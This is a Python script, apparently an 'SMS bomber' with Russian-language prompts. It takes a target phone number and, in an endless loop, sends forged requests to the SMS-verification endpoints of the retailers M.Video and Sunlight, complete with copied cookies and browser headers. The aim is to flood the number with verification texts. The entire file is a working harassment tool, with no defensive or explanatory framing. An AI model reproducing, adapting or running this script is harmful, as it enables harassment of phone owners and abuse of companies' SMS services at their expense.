import requests

curr = 0

print('''
╔╗╔╗╔══╗
║╔╗║║║║║
║╚╝╚╣╚╝║
║╔═╗╠═╗║
║╚═╝║╔╝║
╚═══╝╚═╝
╔═══╦╗╔╦══╦══╦═══╦╗╔╦═══╦╗─╔╦═══╗
║╔═╗║║║║╔╗║╔═╣╔═╗║║║║╔══╣╚═╝║╔══╝
║╚═╝║╚╝║║║║╚═╣╚═╝║╚╝║╚══╣╔╗─║╚══╗
║╔══╣╔╗║║║╠═╗║╔══╣╔╗║╔══╣║╚╗║╔══╝
║║──║║║║╚╝╠═╝║║──║║║║╚══╣║─║║╚══╗
╚╝──╚╝╚╩══╩══╩╝──╚╝╚╩═══╩╝─╚╩═══╝''')

print('''
	Для оставки скрипта на андроид - Vol(-)+C
	на Windows / linux - Ctrl+C


	''')
phone = input('Номер Телефона: +7')
phone1 = '7' + phone
def infinity():
	curr = 0
	while True:
		cl = requests.session()
		cl.get('https://www.mvideo.ru/sitebuilder/components/phoneVerification/sendSmsCode.json.jsp')
		newcook = '__SourceTracker=google__organic;_dc_gtm_UA-1873769-1=1;_fbp=1548089553260;_ga=1118344361;_gat_owox37=1;_gcl_au=397168788;_gid=289341971;_ym_d=1547846842;_ym_isad=2;_ym_uid=1547846842874071677;_ym_visorc_25907066=w;_ym_visorc_338158=b;BIGipServeratg-ps-prod_tcp80='+cl.cookies['BIGipServeratg-ps-prod_tcp80']+';bIPs='+cl.cookies['bIPs']+';CACHE_INDICATOR='+cl.cookies['CACHE_INDICATOR']+';COMPARISON_INDICATOR='+cl.cookies['COMPARISON_INDICATOR']+';cto_idcpy=f13ff313-a794-4213-8136-452b7cb46ab8;cto_lwid=c4fb55af-e800-4aa6-a020-7797a2510be0;deviceType=desktop;flacktory='+cl.cookies['flacktory']+';Flocktory_Global_ID=4a848e72-a240-47d3-aaeffa8ae67bdd2b;flocktory-uuid=b8cd369d-ffc6-45cc-9fe9-0e51948ef7c9-8;JSESSIONID'+cl.cookies['JSESSIONID']+';MVID_CITY_ID='+cl.cookies['MVID_CITY_ID']+';MVID_GUEST_ID='+cl.cookies['MVID_GUEST_ID']+';MVID_VIEWED_PRODUCTS='''+';tmr_detect=0|1548089556738;TS0102af22='+cl.cookies['TS0102af22']+';TS0102af22_77=08e3680a10ab28000e39f4bb39e0cf339a7e5f1189c45465b0c27e2b7ed92d9de1494f0bb365d7d804e5e784f65b7d7e083af2c9c08238003acc11662a964627e64bb241d9f9b7f874bc8b75d4b16fb4d42278a017963461daec9960021cce1f17628d24438a180081db36f48e1a81db;TS01189d65='+cl.cookies['TS01189d65']+';TS01ce11b2=01ed0a41c8db23e98adbf724600dcaa4a69363eb702e5e5714b57c1c5145d67beb858c9a248fd9a16d3ff119482bc952c7e3b8812c;uxs_uid=ea77bc50-1d9c-11e9-9009-53c0a7c4cdb3;wurfl_device_id=generic_web_browser;'
		r = requests.post('https://www.mvideo.ru/sitebuilder/components/phoneVerification/sendSmsCode.json.jsp', data = {'phone':phone}, headers = {'Accept-Encoding':'gzip, deflate, br','Accept-Language':'en-US,en;q=0.5','Connection':'keep-alive','Cookie':newcook,'Host':'www.mvideo.ru','Referer':'https://www.mvideo.ru/register?sn=false','User-Agent':'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:64.0) Gecko/20100101 Firefox/64.0','X-Requested-With':'XMLHttpRequest'})
		###
		rSL = requests.post('https://api.sunlight.net/v3/customers/authorization/', data = {'phone':phone1}, headers = {'Accept-Encoding':'gzip, deflate, br','Accept-Language':'en-US,en;q=0.5','Connection':'keep-alive','Cookie':'_fbp=1548089029383;_ga=GA1.2.1643496723.1548089014;_gat_owox=1;_gat_test=1;_gcl_au=1.1.541266814.1548089013;_gid=GA1.2.339032438.1548089014;_ym_d=1548089016;_ym_isad=2;_ym_uid=1548089016524397773;_ym_visorc_5901091=w;c_medium=referral;c_source=www.google.com;cto_lwid;region_id=91eae2f5-b1d7-442f-bc86-c6c11c581fad;region_subdomain=','Host':'api.sunlight.net','Origin':'https://sunlight.net','Referer':'https://sunlight.net/profile/login/','User-Agent':'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:64.0) Gecko/20100101 Firefox/64.0'})
		curr +=1
		print('Отправлен запрос №',curr)
infinity()
